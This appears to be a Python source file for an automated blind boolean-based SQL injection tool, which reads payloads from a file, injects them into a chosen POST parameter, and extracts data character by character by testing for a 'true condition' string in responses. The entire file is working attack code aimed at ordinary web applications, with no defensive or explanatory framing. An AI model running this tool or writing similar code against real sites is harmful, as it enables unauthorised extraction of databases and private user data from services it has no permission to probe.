import time
import math
import requests as req


class Post():

    def __init__(self, target, vulnParam, keys, trucon, headers):

        # error list
        errorDetected = []
        # error list

        # target
        if target.find('http://') != 0 or target.find('https://') == 0:
            self.target = 'http://'+target.replace('https://', '')
        else:
            self.target = target
        # target

        # keys form
        self.keys = keys
        # keys form

        # vuln param
        self.vulnParam = vulnParam
        # vuln param

        # true condition
        self.trucon = trucon
        # true condition

        # headers
        if type(headers) == dict:
            self.headers = headers
        else:
            errorDetected.append('[!] headers must be dictionary')
        # headers

        # normal
        self.normal = ''
        # normal

        # printing error
        if len(errorDetected) > 0:
            for i in errorDetected:
                print(i)
            exit()
        # printing error

    def execute(self):

        # payload list
        payloads = [i for i in (
            open('payloads.txt').read()).split('\n') if i.strip()]
        # payload list

        # requesting
        def request(payload, index, operator, range):

            payload = {
                f"{self.vulnParam}": ((payload.replace('{#}', str(index))).replace('>', operator)).replace('{$}', str(range))
            }
            for i in self.keys:
                payload.update({
                    f"{i}": "injecting@gmail.com"
                })
            response = req.post(self.target, data=payload,
                                headers=self.headers).text
            if self.trucon in response:
                return chr(range)
            else:
                return False
        # requesting

        # detector
        startTime = {
            "hour": time.localtime().tm_hour,
            "minute": time.localtime().tm_min,
            "second": time.localtime().tm_sec
        }
        for payload in payloads:
            start = 1
            to = 2
            while start < to:
                memory = {'start': '', 'end': ''}

                check = [
                    33, 38, 43, 48, 53, 58, 63, 68, 73, 78,
                    83, 93, 98, 103, 108, 113, 118, 126
                ]

                loop = True

                while loop:

                    if memory['end'] == 33:
                        print('\n')
                        start += to
                        loop = False
                    if memory['start'] and memory['end']:
                        middle = [i for i in range(
                            memory['start'], memory['end']+1)][2]
                        if request(payload, start, '>=', middle):
                            memory['start'] = middle
                        else:
                            memory['end'] = middle

                        for i in range(memory['start'], memory['end']+1):
                            response = request(payload, start, '=', i)
                            if response:
                                print(response, end='', flush=True)
                                start += 1
                                to += 1
                                loop = False

                    elif memory['start']:
                        for i in check:
                            if i == 33:
                                continue
                            if i > memory['start']:
                                if request(payload, start, '<=', i):
                                    memory['end'] = i
                                    break
                                else:
                                    memory['start'] = i

                    elif memory['end']:
                        check.reverse()
                        for i in check:
                            if i < memory['end']:
                                if request(payload, start, '>=', i):
                                    memory['start'] = i
                                    break
                                else:
                                    memory['end'] = i

                    else:
                        if request(payload, start, '>=', 87):
                            memory['start'] = 87
                        else:
                            memory['end'] = 87
        # detector

        # finish
        endTime = {
            "hour": time.localtime().tm_hour,
            "minute": time.localtime().tm_min,
            "second": time.localtime().tm_sec
        }
        print('[ Finish ]'.center(50, '='))
        print(
            f'\nFinish in : [ {endTime["hour"]-startTime["hour"]}H:{endTime["minute"]-startTime["minute"]}M:{endTime["second"]-startTime["second"]}S ]\n')
        # finish
